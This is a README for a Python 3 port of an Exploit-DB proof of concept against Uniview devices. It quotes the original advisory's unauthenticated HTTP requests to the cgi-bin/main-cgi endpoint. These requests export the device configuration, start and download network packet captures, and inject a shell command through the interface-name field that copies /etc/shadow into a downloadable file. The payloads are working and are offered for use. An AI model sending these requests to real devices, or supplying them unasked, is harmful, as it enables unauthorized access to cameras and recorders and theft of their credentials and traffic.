# uniview-password-disclosure
A cleaned up version of 43999.py since it was borked on Exploit-DB - ported to py3.


# Usage
```
git clone https://github.com/pry0cc/uniview-password-disclosure/
cd uniview-password-disclosure/
python3 exploit.py http://ip:port/
```

```
https://www.exploit-db.com/exploits/43999
[STX]

Subject: Uniview RCE and export config PoC
Researcher: bashis <mcw noemail eu> (October 2017)

Attack Vector: Remote
Authentication: Anonymous (no credentials needed)

[Export config]
http://IP:PORT/cgi-bin/main-cgi?json={"cmd":255,"szUserName":"","u32UserLoginHandle":-1}

-[tcpdump]-

[check active capture]
http://IP:PORT/cgi-bin/main-cgi?json={"cmd":263,"szUserName":"","u32UserLoginHandle":-1}

[start capture]
http://IP:PORT/cgi-bin/main-cgi?json={"cmd":264,"status":1,"bSelectAllPort":1,"stSelPort":0,"bSelectAllIp":1,"stSelIp":0,"stSelNicName":"eth0"}

[stop capture]
http://IP:PORT/cgi-bin/main-cgi?json={"cmd":264,"status":0,"bSelectAllPort":1,"stSelPort":0,"bSelectAllIp":1,"stSelIp":0,"stSelNicName":"eth0"}

[download capture]
http://IP:PORT/cgi-bin/main-cgi?json={"cmd":265,"szUserName":"","u32UserLoginHandle":-1}

-[Remote Command Execution]-

[Get /etc/shadow]
http://IP:PORT/cgi-bin/main-cgi?json={"cmd":264,"status":1,"bSelectAllPort":1,"stSelPort":0,"bSelectAllIp":1,"stSelIp":0,"stSelNicName":";cp%20/etc/shadow%20/tmp/packetcapture.pcap;"}

[get the result]
http://IP:PORT/cgi-bin/main-cgi?json={"cmd":265,"szUserName":"","u32UserLoginHandle":-1}

[ETX]
```
